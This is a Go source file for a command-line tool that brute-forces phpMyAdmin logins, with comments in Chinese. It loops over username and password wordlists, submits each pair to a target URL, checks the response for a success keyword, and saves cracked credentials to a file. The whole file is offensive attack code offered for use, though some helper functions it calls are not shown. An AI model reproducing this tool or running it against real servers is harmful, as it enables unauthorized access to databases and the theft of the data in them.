/*
	DES:PHPMYADMIN暴力破解 V1.0
	Author:冰封<574578944@qq.com>
	Date:2021-01-13
*/

package main

import (
	"flag"
	"fmt"
	"log"
	"net/url"
	"os"
	"path/filepath"
	"strings"
)

var (
	targetURL  string
	userFile   string
	passFile   string
	outputFile string
)

func init() {
	//flag.TypeVar(Type指针, flag名, 默认值, 帮助信息)
	flag.StringVar(&targetURL, "url", "", "Use -url <target url>")
	flag.StringVar(&userFile, "u", "", "Use -u <user file>")
	flag.StringVar(&passFile, "p", "", "Use -p <pass file>")
	flag.StringVar(&outputFile, "o", "", "Use -o <output file>")
}

func main() {
	flag.Parse() //解析命令行参数
	//fmt.Println(targetURL, userFile, passFile, outputFile)

	if flag.NFlag() == 3 { //命令行输入的参数个数等于3
		runs(userFile, passFile, targetURL, "success.txt")
	} else if flag.NFlag() == 4 { //命令行输入的参数个数等于4
		runs(userFile, passFile, targetURL, outputFile)
	} else {
		fmt.Printf("USAGE: phpmyadmin暴力破解 -url http://example.com/phpmyadmin/ -u user.txt -p pass.txt\n")
		fmt.Printf("没有命令输入，请在终端中运行此程序。/No command prvoided, Please run this program in terminal.\n按任意键继续... / Press Enter to continue...\n")
		var input string
		fmt.Scanln(&input)
	}

}

//任务处理
func runs(uFile, pFile, websiteURL, outputFile string) {
	//initAll()
	userdataArr := ReadFiles(uFile) //返回账户文件中数据 return  array
	passdataArr := ReadFiles(pFile) //返回密码文件中数据 return  array

	for _, userVal := range userdataArr { //遍历账户数据

		for _, passVal := range passdataArr { //遍历密码数据
			//fmt.Println(userVal, "--->", passVal)

			LoginURL := websiteURL + `/index.php?pma_username=` + url.QueryEscape(userVal) + `&pma_password=` + url.QueryEscape(passVal)
			html := loginCracking(LoginURL)                        //登录phpmyadmin
			if strings.Contains(html, "Database server") == true { //查找登录后关键字词信息来判断是否登录OK
				log.Println(" Username:"+userVal, " 	PassWord:"+passVal, " 	Success")
				path, _ := os.Executable() //当前脚本目录位置

				//爆破成功的信息里立即写入文件
				WriteData := "user:" + userVal + "	pass:" + passVal + "	Status:OK"
				WriteFiles(outputFile, WriteData)
				mess := "Messages: Congratulations, brute force cracked successfully!" + filepath.Dir(path) + `\` + outputFile
				setFontColor("red", mess)
				os.Exit(1) //爆破成功立即停止
			} else {
				log.Println(" Username:"+userVal, " 	PassWord:"+passVal, " 	Fail")
			}
		}
	}
}
